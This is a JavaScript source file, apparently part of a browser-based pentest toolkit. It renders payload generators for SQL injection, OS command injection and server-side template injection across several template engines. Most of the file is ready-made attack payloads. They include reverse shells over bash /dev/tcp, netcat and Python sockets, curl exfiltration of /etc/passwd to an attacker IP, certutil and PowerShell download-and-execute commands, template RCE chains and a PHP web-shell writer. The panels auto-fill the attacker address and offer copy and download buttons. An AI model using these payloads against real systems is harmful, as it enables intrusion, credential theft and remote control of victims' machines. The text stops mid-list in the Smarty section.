          ${encSelectHtml("sqli-enc", ["none", "url", "doubleUrl", "base64", "hexEscape", "unicodeEscape", "htmlHex"], encMode)}
        </div>
        <div class="pg-check-row" id="sqli-evasions">
          ${Object.entries(SQLI_EVASIONS).map(([k, t]) => `<label><input type="checkbox" data-k="${k}" ${selectedEvasions.includes(k) ? "checked" : ""}> ${esc(t.label)}</label>`).join("")}
        </div>
        <div class="tk-btns">
          <button class="btn sm" id="sqli-copyall">Copy all shown (${items.length})</button>
          <button class="btn sm ghost" id="sqli-download">Download .txt</button>
        </div>
        <div class="pg-stats-row">
          <div class="stat"><div class="stat-n">${items.length}</div><div class="stat-l">shown</div></div>
          <div class="stat"><div class="stat-n">${Object.values(SQLI_PAYLOADS).reduce((a, arr) => a + arr.length, 0)}</div><div class="stat-l">total across all DBs</div></div>
          <div class="stat"><div class="stat-n">${SQLI_CATS.length}</div><div class="stat-l">technique categories</div></div>
        </div>
        <div class="pg-list" id="sqli-list">${items.map((it, i) => `
          <div class="pg-item">
            <div class="pg-item-top"><span class="pg-item-group">${esc(it.cat)}</span><button class="btn sm ghost pg-copy" data-i="${i}">copy</button></div>
            <code class="dl-cmd cmd-block pg-code">${esc(transformed(it.p))}</code>
          </div>`).join("") || `<div class="pg-empty">No payloads match the current filters.</div>`}
        </div>
      </div>`;

    container.querySelectorAll("#sqli-dbtabs button").forEach((b) => { b.onclick = () => { db = b.dataset.db; paint(); }; });
    container.querySelector("#sqli-search").oninput = (e) => { search = e.target.value; paint(); };
    container.querySelector("#sqli-cat").onchange = (e) => { catFilter = e.target.value; paint(); };
    container.querySelector("#sqli-enc").onchange = (e) => { encMode = e.target.value; paint(); };
    container.querySelectorAll("#sqli-evasions input[type=checkbox]").forEach((cb) => {
      cb.onchange = () => {
        const k = cb.dataset.k;
        if (cb.checked) selectedEvasions.push(k);
        else selectedEvasions = selectedEvasions.filter((x) => x !== k);
        paint();
      };
    });
    container.querySelector("#sqli-copyall").onclick = (e) => { copyText(items.map((it) => transformed(it.p)).join("\n")); flashBtn(e.target, "copied!"); };
    container.querySelector("#sqli-download").onclick = () => downloadText("sqli-" + db + "-payloads.txt", items.map((it) => transformed(it.p)).join("\n"));
    container.querySelectorAll(".pg-copy").forEach((b) => {
      b.onclick = () => { copyText(transformed(items[+b.dataset.i].p)); flashBtn(b, "copied"); };
    });
  }

  paint();
}

/* ============================================================================================
 * Command Injection
 * ========================================================================================== */

const CMDI_PAYLOADS = {
  linux: [
    { p: "; id", cat: "Basic execution" },
    { p: "; whoami", cat: "Basic execution" },
    { p: "&& id", cat: "Basic execution" },
    { p: "&& whoami", cat: "Basic execution" },
    { p: "|| id", cat: "Basic execution" },
    { p: "| id", cat: "Basic execution" },
    { p: "| whoami", cat: "Basic execution" },
    { p: "& id", cat: "Basic execution" },
    { p: "\nid", cat: "Basic execution" },
    { p: "`id`", cat: "Basic execution" },
    { p: "$(id)", cat: "Basic execution" },
    { p: "; cat /etc/passwd", cat: "Basic execution" },
    { p: "; cat /etc/shadow", cat: "Basic execution" },
    { p: "; uname -a", cat: "Basic execution" },
    { p: "; ls -la /", cat: "Basic execution" },
    { p: "; ifconfig", cat: "Basic execution" },
    { p: "; ip a", cat: "Basic execution" },
    { p: "; ps aux", cat: "Basic execution" },
    { p: "; env", cat: "Basic execution" },
    { p: "; echo vulnerable", cat: "Basic execution" },
    { p: "%0a id", cat: "Basic execution" },
    { p: "%0d%0a id", cat: "Basic execution" },
    { p: "; id;", cat: "Basic execution" },
    { p: "';id;'", cat: "Basic execution" },
    { p: "\";id;\"", cat: "Basic execution" },
    { p: "; sleep 5", cat: "Blind time-based" },
    { p: "&& sleep 5", cat: "Blind time-based" },
    { p: "| sleep 5", cat: "Blind time-based" },
    { p: "|| sleep 5", cat: "Blind time-based" },
    { p: "`sleep 5`", cat: "Blind time-based" },
    { p: "$(sleep 5)", cat: "Blind time-based" },
    { p: "; ping -c 5 127.0.0.1", cat: "Blind time-based" },
    { p: "; ping -c 5 localhost", cat: "Blind time-based" },
    { p: "; perl -e 'sleep 5'", cat: "Blind time-based" },
    { p: "; python3 -c 'import time;time.sleep(5)'", cat: "Blind time-based" },
    { p: "; timeout 5", cat: "Blind time-based" },
    { p: "$(sleep 5;id)", cat: "Blind time-based" },
    { p: "; curl -m 5 http://127.0.0.1", cat: "Blind time-based" },
    { p: "; curl http://ATTACKER_IP/`whoami`", cat: "Out-of-band" },
    { p: "; curl http://ATTACKER_IP/$(id)", cat: "Out-of-band" },
    { p: "; wget http://ATTACKER_IP/`id`", cat: "Out-of-band" },
    { p: "; nc ATTACKER_IP 4444 -e /bin/bash", cat: "Out-of-band" },
    { p: "; bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1", cat: "Out-of-band" },
    { p: "; curl -X POST -d \"$(cat /etc/passwd)\" http://ATTACKER_IP/exfil", cat: "Out-of-band" },
    { p: "; nslookup $(whoami).ATTACKER_DOMAIN", cat: "Out-of-band" },
    { p: "; dig $(id -u).ATTACKER_DOMAIN", cat: "Out-of-band" },
    { p: "; ping -c 1 $(whoami).ATTACKER_DOMAIN", cat: "Out-of-band" },
    { p: "; curl http://ATTACKER_IP/$(cat /etc/passwd|base64)", cat: "Out-of-band" },
    { p: "; python3 -c \"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('ATTACKER_IP',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])\"", cat: "Out-of-band" },
    { p: "; echo aWQ= | base64 -d | bash", cat: "Encoded / obfuscated" },
    { p: "; $(echo aWQ=|base64 -d)", cat: "Encoded / obfuscated" },
    { p: "; echo${IFS}vulnerable", cat: "Encoded / obfuscated" },
    { p: ";i${IFS}d", cat: "Encoded / obfuscated" },
    { p: ";i$@d", cat: "Encoded / obfuscated" },
    { p: ";{cat,/etc/passwd}", cat: "Encoded / obfuscated" },
    { p: ";cat${IFS}/etc/passwd", cat: "Encoded / obfuscated" },
    { p: ";c\\at /etc/passwd", cat: "Encoded / obfuscated" },
    { p: ";'c''a''t' /etc/passwd", cat: "Encoded / obfuscated" },
    { p: ';cat$IFS$9/etc/passwd', cat: "Encoded / obfuscated" },
    { p: ";cat<>/etc/passwd", cat: "Encoded / obfuscated" },
    { p: ";cat /e??/pa??wd", cat: "Encoded / obfuscated" },
    { p: ";cat /et*/pas*", cat: "Encoded / obfuscated" },
    { p: ";$(printf '\\151\\144')", cat: "Encoded / obfuscated" },
    { p: ";`printf 'id'`", cat: "Encoded / obfuscated" },
    { p: "; /bin/ca\\t /etc/passwd", cat: "Encoded / obfuscated" },
    { p: "%0aid%0a", cat: "Encoded / obfuscated" },
    { p: "; id #", cat: "Encoded / obfuscated" },
    { p: "|id|", cat: "Encoded / obfuscated" },
  ],
  windows: [
    { p: "& whoami", cat: "Basic execution" },
    { p: "&& whoami", cat: "Basic execution" },
    { p: "| whoami", cat: "Basic execution" },
    { p: "|| whoami", cat: "Basic execution" },
    { p: "& dir", cat: "Basic execution" },
    { p: "& type C:\\Windows\\win.ini", cat: "Basic execution" },
    { p: "& ipconfig /all", cat: "Basic execution" },
    { p: "& net user", cat: "Basic execution" },
    { p: "& systeminfo", cat: "Basic execution" },
    { p: "& tasklist", cat: "Basic execution" },
    { p: "& echo vulnerable", cat: "Basic execution" },
    { p: "%0a whoami", cat: "Basic execution" },
    { p: "%0d%0a whoami", cat: "Basic execution" },
    { p: "| type C:\\Windows\\win.ini", cat: "Basic execution" },
    { p: "; whoami", cat: "Basic execution" },
    { p: "cmd /c whoami", cat: "Basic execution" },
    { p: "cmd.exe /c dir", cat: "Basic execution" },
    { p: "& powershell -Command \"whoami\"", cat: "Basic execution" },
    { p: "& powershell.exe Get-Process", cat: "Basic execution" },
    { p: "& wmic os get caption", cat: "Basic execution" },
    { p: "& wmic process list", cat: "Basic execution" },
    { p: "& net localgroup administrators", cat: "Basic execution" },
    { p: "& echo %USERNAME%", cat: "Basic execution" },
    { p: "& set", cat: "Basic execution" },
    { p: "& whoami &", cat: "Basic execution" },
    { p: "& ping -n 5 127.0.0.1", cat: "Blind time-based" },
    { p: "&& ping -n 5 127.0.0.1", cat: "Blind time-based" },
    { p: "| ping -n 5 127.0.0.1", cat: "Blind time-based" },
    { p: "& timeout /t 5", cat: "Blind time-based" },
    { p: "& powershell -Command \"Start-Sleep -Seconds 5\"", cat: "Blind time-based" },
    { p: "& powershell Start-Sleep 5", cat: "Blind time-based" },
    { p: "& ping -n 5 localhost", cat: "Blind time-based" },
    { p: "& ping 127.0.0.1 -n 5", cat: "Blind time-based" },
    { p: "& powershell -c \"sleep 5\"", cat: "Blind time-based" },
    { p: "& powershell -Command \"1..5|%{sleep 1}\"", cat: "Blind time-based" },
    { p: "& powershell -Command \"Test-Connection -Count 5 -ComputerName 127.0.0.1\"", cat: "Blind time-based" },
    { p: "& ping -n 5 -w 1000 127.0.0.1", cat: "Blind time-based" },
    { p: "& powershell -Command \"Invoke-WebRequest -Uri http://ATTACKER_IP/$(whoami)\"", cat: "Out-of-band" },
    { p: "& powershell -Command \"iwr http://ATTACKER_IP/$env:USERNAME\"", cat: "Out-of-band" },
    { p: "& certutil -urlcache -split -f http://ATTACKER_IP/payload.exe C:\\Windows\\Temp\\p.exe", cat: "Out-of-band" },
    { p: "& nslookup %USERNAME%.ATTACKER_DOMAIN", cat: "Out-of-band" },
    { p: "& ping -n 1 %COMPUTERNAME%.ATTACKER_DOMAIN", cat: "Out-of-band" },
    { p: "& powershell -Command \"[Net.WebClient]::new().DownloadString('http://ATTACKER_IP/'+$env:USERNAME)\"", cat: "Out-of-band" },
    { p: "& bitsadmin /transfer job http://ATTACKER_IP/payload.exe C:\\Windows\\Temp\\p.exe", cat: "Out-of-band" },
    { p: "& powershell -Command \"IEX(New-Object Net.WebClient).downloadString('http://ATTACKER_IP/shell.ps1')\"", cat: "Out-of-band" },
    { p: "& powershell -Command \"$c=New-Object Net.Sockets.TCPClient('ATTACKER_IP',4444)\"", cat: "Out-of-band" },
    { p: "& curl http://ATTACKER_IP/%USERNAME%", cat: "Out-of-band" },
    { p: "& powershell -EncodedCommand d2hvYW1p", cat: "Encoded / obfuscated" },
    { p: "& powershell -enc JABjAGwAaQBlAG4AdAA=", cat: "Encoded / obfuscated" },
    { p: "& c^md /c whoami", cat: "Encoded / obfuscated" },
    { p: "& who^ami", cat: "Encoded / obfuscated" },
    { p: "& %COMSPEC% /c whoami", cat: "Encoded / obfuscated" },
    { p: "& %WINDIR%\\system32\\cmd.exe /c whoami", cat: "Encoded / obfuscated" },
    { p: "& w'h'oami", cat: "Encoded / obfuscated" },
    { p: "& who\"am\"i", cat: "Encoded / obfuscated" },
    { p: "& (whoami)", cat: "Encoded / obfuscated" },
    { p: "& po^wershell -c whoami", cat: "Encoded / obfuscated" },
    { p: "& powershell -c \"[char[]](119,104,111,97,109,105) -join ''|iex\"", cat: "Encoded / obfuscated" },
    { p: "& for /f %i in ('whoami') do echo %i", cat: "Encoded / obfuscated" },
    { p: "& cmd /c \"whoami\"", cat: "Encoded / obfuscated" },
    { p: "& cmd /v:on /c \"set x=whoami!x!\"", cat: "Encoded / obfuscated" },
    { p: "& forfiles /p C:\\Windows\\System32 /m cmd.exe /c \"cmd /c whoami\"", cat: "Encoded / obfuscated" },
  ],
};

const CMDI_OS_LABELS = { linux: "Linux / Unix", windows: "Windows" };
const CMDI_CATS = ["Basic execution", "Blind time-based", "Out-of-band", "Encoded / obfuscated"];

const CMDI_SEPARATORS_LINUX = [";", "&&", "||", "|", "&", "\n", "%0a", "%0d%0a", "`", "$()"];
const CMDI_SEPARATORS_WINDOWS = ["&", "&&", "||", "|", "\n", "%0a", "%0d%0a"];

function renderCmdiPanel(container) {
  let os = "linux";
  let catFilter = "all";
  let search = "";
  let encMode = "none";
  let attackerIp = "10.10.14.1";
  let attackerDomain = "attacker.oob";

  function baseFiltered() {
    const q = search.trim().toLowerCase();
    return CMDI_PAYLOADS[os].filter((it) => {
      if (catFilter !== "all" && it.cat !== catFilter) return false;
      if (q && !it.p.toLowerCase().includes(q)) return false;
      return true;
    });
  }

  function withPlaceholders(p) {
    return p.replace(/ATTACKER_IP/g, attackerIp).replace(/ATTACKER_DOMAIN/g, attackerDomain);
  }

  function transformed(p) {
    return applyEnc(encMode, withPlaceholders(p));
  }

  function paint() {
    const items = baseFiltered();
    const seps = os === "linux" ? CMDI_SEPARATORS_LINUX : CMDI_SEPARATORS_WINDOWS;
    container.innerHTML = `
      <div class="panel pg-panel-inner">
        <h2 class="pg-h2" style="margin-top:0">Command Injection Payload Generator <span class="pg-count-badge">${CMDI_PAYLOADS[os].length} payloads for ${esc(CMDI_OS_LABELS[os])}</span></h2>
        <p class="muted">OS command injection payloads for basic execution, blind time-based detection, out-of-band exfiltration, and encoded/obfuscated bypasses. Set your listener IP/domain to auto-fill OOB payloads.</p>
        <div class="pg-sub-tabs" id="cmdi-ostabs">
          ${Object.keys(CMDI_OS_LABELS).map((o) => `<button data-os="${o}" class="${o === os ? "active" : ""}">${esc(CMDI_OS_LABELS[o])}</button>`).join("")}
        </div>
        <div class="tk-row pg-opts-row">
          <input class="tk-f" id="cmdi-ip" placeholder="attacker IP" value="${esc(attackerIp)}" style="max-width:150px">
          <input class="tk-f" id="cmdi-domain" placeholder="attacker OOB domain" value="${esc(attackerDomain)}" style="max-width:190px">
        </div>
        <div class="tk-row pg-opts-row">
          <input class="tk-f" id="cmdi-search" placeholder="search payloads..." value="${esc(search)}" style="flex:2;min-width:180px">
          <select class="tk-f" id="cmdi-cat" style="min-width:190px">
            <option value="all"${catFilter === "all" ? " selected" : ""}>All categories</option>
            ${CMDI_CATS.map((c) => `<option value="${esc(c)}"${catFilter === c ? " selected" : ""}>${esc(c)}</option>`).join("")}
          </select>
          ${encSelectHtml("cmdi-enc", ["none", "url", "doubleUrl", "base64", "hexEscape", "unicodeEscape"], encMode)}
        </div>
        <div class="pg-note muted" style="margin:6px 0">Common separators for ${esc(CMDI_OS_LABELS[os])}: <code class="mono">${seps.map(esc).join("  ")}</code></div>
        <div class="tk-btns">
          <button class="btn sm" id="cmdi-copyall">Copy all shown (${items.length})</button>
          <button class="btn sm ghost" id="cmdi-download">Download .txt</button>
        </div>
        <div class="pg-stats-row">
          <div class="stat"><div class="stat-n">${items.length}</div><div class="stat-l">shown</div></div>
          <div class="stat"><div class="stat-n">${CMDI_PAYLOADS.linux.length + CMDI_PAYLOADS.windows.length}</div><div class="stat-l">total both OS</div></div>
          <div class="stat"><div class="stat-n">${seps.length}</div><div class="stat-l">separators</div></div>
        </div>
        <div class="pg-list" id="cmdi-list">${items.map((it, i) => `
          <div class="pg-item">
            <div class="pg-item-top"><span class="pg-item-group">${esc(it.cat)}</span><button class="btn sm ghost pg-copy" data-i="${i}">copy</button></div>
            <code class="dl-cmd cmd-block pg-code">${esc(transformed(it.p))}</code>
          </div>`).join("") || `<div class="pg-empty">No payloads match the current filters.</div>`}
        </div>
      </div>`;

    container.querySelectorAll("#cmdi-ostabs button").forEach((b) => { b.onclick = () => { os = b.dataset.os; paint(); }; });
    container.querySelector("#cmdi-ip").oninput = (e) => { attackerIp = e.target.value || "10.10.14.1"; paint(); };
    container.querySelector("#cmdi-domain").oninput = (e) => { attackerDomain = e.target.value || "attacker.oob"; paint(); };
    container.querySelector("#cmdi-search").oninput = (e) => { search = e.target.value; paint(); };
    container.querySelector("#cmdi-cat").onchange = (e) => { catFilter = e.target.value; paint(); };
    container.querySelector("#cmdi-enc").onchange = (e) => { encMode = e.target.value; paint(); };
    container.querySelector("#cmdi-copyall").onclick = (e) => { copyText(items.map((it) => transformed(it.p)).join("\n")); flashBtn(e.target, "copied!"); };
    container.querySelector("#cmdi-download").onclick = () => downloadText("cmdi-" + os + "-payloads.txt", items.map((it) => transformed(it.p)).join("\n"));
    container.querySelectorAll(".pg-copy").forEach((b) => {
      b.onclick = () => { copyText(transformed(items[+b.dataset.i].p)); flashBtn(b, "copied"); };
    });
  }

  paint();
}

/* ============================================================================================
 * Server-Side Template Injection (SSTI)
 * ========================================================================================== */

const SSTI_PAYLOADS = {
  jinja2: [
    { p: "{{7*7}}", cat: "Detection" },
    { p: "{{7*'7'}}", cat: "Detection" },
    { p: "${7*7}", cat: "Detection" },
    { p: "{{config}}", cat: "Detection" },
    { p: "{{self}}", cat: "Detection" },
    { p: "{{''.__class__}}", cat: "Detection" },
    { p: "{{[].__class__}}", cat: "Detection" },
    { p: "{{request}}", cat: "Detection" },
    { p: "{{config.items()}}", cat: "Information disclosure" },
    { p: "{{self.__dict__}}", cat: "Information disclosure" },
    { p: "{{request.application.__globals__}}", cat: "Information disclosure" },
    { p: "{{cycler.__init__.__globals__.os}}", cat: "Information disclosure" },
    { p: "{{lipsum.__globals__.os}}", cat: "Information disclosure" },
    { p: "{{joiner.__init__.__globals__.os}}", cat: "Information disclosure" },
    { p: "{{namespace.__init__.__globals__.os}}", cat: "Information disclosure" },
    { p: "{{''.__class__.__mro__[1].__subclasses__()}}", cat: "RCE" },
    { p: "{{''.__class__.__mro__[1].__subclasses__()[396]('cat /etc/passwd',shell=True,stdout=-1).communicate()}}", cat: "RCE" },
    { p: "{{''.__class__.__mro__[1].__subclasses__()[406]('id',shell=True,stdout=-1).communicate()}}", cat: "RCE" },
    { p: "{{ ().__class__.__bases__[0].__subclasses__()[133].__init__.__globals__['system']('id') }}", cat: "RCE" },
    { p: "{% for x in ().__class__.__base__.__subclasses__() %}{% if 'warning' in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen('id').read()}}{% endif %}{% endfor %}", cat: "RCE" },
    { p: "{{cycler.__init__.__globals__.os.popen('id').read()}}", cat: "RCE" },
    { p: "{{lipsum.__globals__.os.popen('id').read()}}", cat: "RCE" },
    { p: "{{lipsum.__globals__['os'].popen('id').read()}}", cat: "RCE" },
    { p: "{{joiner.__init__.__globals__.os.popen('id').read()}}", cat: "RCE" },
    { p: "{% set x = namespace() %}{% set x.os = lipsum.__globals__.os %}{{x.os.popen('id').read()}}", cat: "RCE" },
    { p: "{{get_flashed_messages.__globals__.__builtins__.__import__('os').popen('id').read()}}", cat: "RCE" },
    { p: "{{url_for.__globals__.os.popen('id').read()}}", cat: "RCE" },
    { p: "{{[].__class__.__base__.__subclasses__()[104].__init__.__globals__['sys'].modules['os'].popen('id').read()}}", cat: "RCE" },
    { p: "{% import os %}{{os.popen('id').read()}}", cat: "RCE" },
    { p: "{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}", cat: "RCE" },
    { p: "{% raw %}{{ still not filtered }}{% endraw %}", cat: "Filter bypass" },
    { p: "{{'{{7*7}}'}}", cat: "Filter bypass" },
    { p: "{{'{{'~'7*7'~'}}'}}", cat: "Filter bypass" },
    { p: "{{request|attr('application')|attr('__globals__')}}", cat: "Filter bypass" },
    { p: "{{'os'|attr('__class__')}}", cat: "Filter bypass" },
  ],
  twig: [
    { p: "{{7*7}}", cat: "Detection" },
    { p: "{{7*'7'}}", cat: "Detection" },
    { p: "{{dump(app)}}", cat: "Detection" },
    { p: "{{_self}}", cat: "Detection" },
    { p: "{{_self.env}}", cat: "Detection" },
    { p: "{{['id']|filter('system')}}", cat: "RCE" },
    { p: "{{['id','']|sort('system')}}", cat: "RCE" },
    { p: "{{['id']|map('system')|join}}", cat: "RCE" },
    { p: "{{['cat\\x20/etc/passwd']|filter('system')}}", cat: "RCE" },
    { p: "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}", cat: "RCE" },
    { p: "{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}", cat: "RCE" },
    { p: "{% filter e('system') %}id{% endfilter %}", cat: "RCE" },
    { p: "{{['id',1]|sort('exec')}}", cat: "RCE" },
    { p: "{{ ['/etc/passwd'] | map('file_get_contents') | join }}", cat: "File read" },
    { p: "{{'/etc/passwd'|file_get_contents}}", cat: "File read" },
    { p: "{{app.request.server.get('SCRIPT_NAME')}}", cat: "Information disclosure" },
    { p: "{{app.request.query.get('x')}}", cat: "Information disclosure" },
    { p: "{{app.session}}", cat: "Information disclosure" },
    { p: "{{app.request.headers}}", cat: "Information disclosure" },
    { p: "{{app.environment}}", cat: "Information disclosure" },
    { p: "{{constant('PHP_VERSION')}}", cat: "Information disclosure" },
    { p: "{{constant('GLOBAL_KEY',object)}}", cat: "Information disclosure" },
    { p: "{{['id']|reduce('system')}}", cat: "RCE" },
    { p: "{% set cmd = 'id' %}{{cmd|filter('system')}}", cat: "RCE" },
    { p: "{{'find / -name \"*.php\"'|filter('system')}}", cat: "RCE" },
    { p: "{{7*'7'}}foo{{7*'7'}}", cat: "Detection" },
    { p: "{{'a'.constructor.constructor('return process')().mainModule.require('child_process').execSync('id')}}", cat: "RCE" },
    { p: "{% if 1==1 %}vulnerable{% endif %}", cat: "Detection" },
    { p: "{{app.request.query.filter('id')}}", cat: "Filter bypass" },
    { p: "{{['whoami']|filter('system')}}", cat: "RCE" },
    { p: "{{[0]|reduce('system','id')}}", cat: "RCE" },
    { p: "{{_self.getTemplateName()}}", cat: "Information disclosure" },
    { p: "{{_context}}", cat: "Information disclosure" },
    { p: "{{block('content')}}", cat: "Information disclosure" },
  ],
  freemarker: [
    { p: "${7*7}", cat: "Detection" },
    { p: "<#assign value=7*7>${value}", cat: "Detection" },
    { p: "${\"freemarker.template.utility.Execute\"?new()(\"id\")}", cat: "RCE" },
    { p: "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}", cat: "RCE" },
    { p: "<#assign value=\"freemarker.template.utility.Execute\"?new()>${value(\"whoami\")}", cat: "RCE" },
    { p: "${\"freemarker.template.utility.Execute\"?new()(\"cat /etc/passwd\")}", cat: "RCE" },
    { p: "<#assign classloader=object?api.class.protectionDomain.classLoader>", cat: "RCE" },
    { p: "${object.getClass().forName(\"java.lang.Runtime\").getMethod(\"exec\",\"\".class).invoke(object.getClass().forName(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(null),\"id\")}", cat: "RCE" },
    { p: "<#assign value=\"freemarker.template.utility.ObjectConstructor\"?new()>${value(\"java.lang.ProcessBuilder\",\"id\").start()}", cat: "RCE" },
    { p: "${product.getClass().getProtectionDomain().getCodeSource().getLocation()}", cat: "Information disclosure" },
    { p: "<#list .data_model as k,v>${k}=${v}</#list>", cat: "Information disclosure" },
    { p: "${.data_model}", cat: "Information disclosure" },
    { p: "${.globals}", cat: "Information disclosure" },
    { p: "${.now}", cat: "Detection" },
    { p: "${.version}", cat: "Detection" },
    { p: "<#assign x=1+1/>${x}", cat: "Detection" },
    { p: "${\"freemarker.template.utility.JythonRuntime\"?new()(\"id\")}", cat: "RCE" },
    { p: "<#assign ipsum = \"freemarker.template.utility.Execute\"?new()>${ipsum(\"touch success\")}", cat: "RCE" },
    { p: "${'freemarker.template.utility.Execute'?new()('id')}", cat: "RCE" },
    { p: "<#assign value=\"freemarker.template.utility.Execute\"?new()>${value(\"uname -a\")}", cat: "RCE" },
    { p: "${\"freemarker.template.utility.Execute\"?new() (\"echo vulnerable\")}", cat: "Filter bypass" },
    { p: "<#assign x=\"free\"+\"marker.template.utility.Execute\"?new()>${x(\"id\")}", cat: "Filter bypass" },
    { p: "${1+1}", cat: "Detection" },
    { p: "${x?html}", cat: "Filter bypass" },
    { p: "<#if 1==1>vulnerable</#if>", cat: "Detection" },
    { p: "${object?api}", cat: "Information disclosure" },
    { p: "<#assign runtime=\"freemarker.template.utility.Execute\"?new()>${runtime(\"ping -c 5 127.0.0.1\")}", cat: "Blind time-based" },
    { p: "${\"freemarker.template.utility.Execute\"?new()(\"sleep 5\")}", cat: "Blind time-based" },
    { p: "<#assign delay=\"freemarker.template.utility.Execute\"?new()>${delay(\"sleep 5\")}", cat: "Blind time-based" },
    { p: "${statics['java.lang.Runtime'].getRuntime().exec('id')}", cat: "RCE" },
    { p: "<#assign obj = statics['java.lang.Runtime']>${obj.getRuntime().exec('id')}", cat: "RCE" },
  ],
  velocity: [
    { p: "#set($x=7*7)$x", cat: "Detection" },
    { p: "$class.inspect(\"test\").type", cat: "Detection" },
    { p: "#set($str=$class.inspect(\"java.lang.String\").type)", cat: "Detection" },
    { p: "#set($runtime = $class.forName(\"java.lang.Runtime\"))", cat: "RCE" },
    { p: "#set($rt = $runtime.getRuntime())$rt.exec(\"id\")", cat: "RCE" },
    { p: "#set($chr=$class.inspect(\"java.lang.Character\").type)#set($str=$class.inspect(\"java.lang.String\").type)#set($ex=$rt.exec(\"id\"))", cat: "RCE" },
    { p: "#set($x = '')##\n#set($rt = $x.class.forName('java.lang.Runtime'))##\n#set($chr = $x.class.forName('java.lang.Character'))##\n#set($str = $x.class.forName('java.lang.String'))##\n#set($ex = $rt.getRuntime().exec('id'))##\n$ex.waitFor()##\n#set($out = $ex.getInputStream())##\n#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end", cat: "RCE" },
    { p: "#set($process=$runtime.getRuntime().exec(\"whoami\"))", cat: "RCE" },
    { p: "$rt.getRuntime().exec('cat /etc/passwd')", cat: "RCE" },
    { p: "#foreach($i in [1..5])$i#end", cat: "Detection" },
    { p: "$!{7*7}", cat: "Detection" },
    { p: "$number.class", cat: "Information disclosure" },
    { p: "$request", cat: "Information disclosure" },
    { p: "$context.get('key')", cat: "Information disclosure" },
    { p: "#set($x=$context.class)$x", cat: "Information disclosure" },
    { p: "#set($obj = $class.inspect('java.lang.Object').type)", cat: "Detection" },
    { p: "#set($x=1+1)$x", cat: "Detection" },
    { p: "$class.forName('java.lang.Runtime')", cat: "RCE" },
    { p: "#set($process=$runtime.getRuntime().exec('sleep 5'))", cat: "Blind time-based" },
    { p: "#set($process=$runtime.getRuntime().exec('ping -c 5 127.0.0.1'))", cat: "Blind time-based" },
    { p: "#set($ct=$class.forName('java.lang.Runtime').getRuntime())$ct.exec('id')", cat: "RCE" },
    { p: "#set($e='exp')#set($t=$e.class)", cat: "Filter bypass" },
    { p: "#set($a=42)$a", cat: "Detection" },
    { p: "#macro(evil)$class.inspect('java.lang.Runtime')#end#evil()", cat: "Filter bypass" },
    { p: "$!{class.inspect(\"java.lang.Runtime\").type}", cat: "Filter bypass" },
    { p: "#set($x = $class.inspect('java.io.File').type)", cat: "Information disclosure" },
    { p: "#set($x=$class.inspect('java.lang.ProcessBuilder').type)#set($pb=$x.getConstructors()[1].newInstance(['id']))$pb.start()", cat: "RCE" },
    { p: "$esc.html($x)", cat: "Filter bypass" },
    { p: "#set($nl=\"%0a\")$nl", cat: "Filter bypass" },
    { p: "$!bogus.method()", cat: "Detection" },
  ],
  pebble: [
    { p: "{{7*7}}", cat: "Detection" },
    { p: "{{ 7 * 7 }}", cat: "Detection" },
    { p: "{% set a = 7 * 7 %}{{ a }}", cat: "Detection" },
    { p: "{{ 'a' }}", cat: "Detection" },
    { p: "{% if true %}vulnerable{% endif %}", cat: "Detection" },
    { p: "{{ (\"id\").execute() }}", cat: "RCE" },
    { p: "{% set cmd = 'id' %}{{ cmd.execute() }}", cat: "RCE" },
    { p: "{{ ('id').getClass() }}", cat: "Information disclosure" },
    { p: "{{ ('id').getClass().forName('java.lang.Runtime') }}", cat: "RCE" },
    { p: "{% set rt = ('a').getClass().forName('java.lang.Runtime') %}{{ rt.getMethod('exec',T(java.lang.String)).invoke(rt.getMethod('getRuntime').invoke(null), 'id') }}", cat: "RCE" },
    { p: "{{ ''.getClass().forName('java.lang.Runtime').getMethod('exec','java.lang.String'.getClass()).invoke(''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'id') }}", cat: "RCE" },
    { p: "{{ variable }}", cat: "Detection" },
    { p: "{% for i in 1..5 %}{{ i }}{% endfor %}", cat: "Detection" },
    { p: "{{ 1 + 1 }}", cat: "Detection" },
    { p: "{{ obj.runtime.exec('id') }}", cat: "RCE" },
    { p: "{{ pebbleTemplate }}", cat: "Information disclosure" },
    { p: "{{ context }}", cat: "Information disclosure" },
    { p: "{% include \"/etc/passwd\" %}", cat: "File read" },
    { p: "{% extends \"/etc/passwd\" %}", cat: "File read" },
    { p: "{{ '/etc/passwd'|file }}", cat: "File read" },
    { p: "{{ (\"cat /etc/passwd\").execute() }}", cat: "RCE" },
    { p: "{{ (\"sleep 5\").execute() }}", cat: "Blind time-based" },
    { p: "{{ (\"ping -c 5 127.0.0.1\").execute() }}", cat: "Blind time-based" },
    { p: "{% macro evil() %}{{ (\"id\").execute() }}{% endmacro %}{{ evil() }}", cat: "RCE" },
    { p: "{{ block(\"content\") }}", cat: "Information disclosure" },
    { p: "{{ null }}", cat: "Detection" },
    { p: "{{ true and false }}", cat: "Detection" },
    { p: "{{ 5 % 2 }}", cat: "Detection" },
    { p: "{% set x = 'java.lang.Runtime' %}{{ x }}", cat: "Filter bypass" },
    { p: "{{ (\"whoami\").execute() }}", cat: "RCE" },
  ],
  smarty: [
    { p: "{7*7}", cat: "Detection" },
    { p: "{$smarty.version}", cat: "Detection" },
    { p: "{php}echo `id`;{/php}", cat: "RCE" },
    { p: "{php}system('id');{/php}", cat: "RCE" },
    { p: "{system('id')}", cat: "RCE" },
    { p: "{exec('id')}", cat: "RCE" },
    { p: "{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,\"<?php passthru($_GET['cmd']); ?>\",self::clearConfig())}", cat: "RCE" },
    { p: "{self::getStreamVariable('file:///etc/passwd')}", cat: "File read" },
    { p: "{fetch file='/etc/passwd'}", cat: "File read" },
    { p: "{include file='/etc/passwd'}", cat: "File read" },
    { p: "{$smarty.template}", cat: "Information disclosure" },
    { p: "{$smarty.const.PHP_VERSION}", cat: "Information disclosure" },
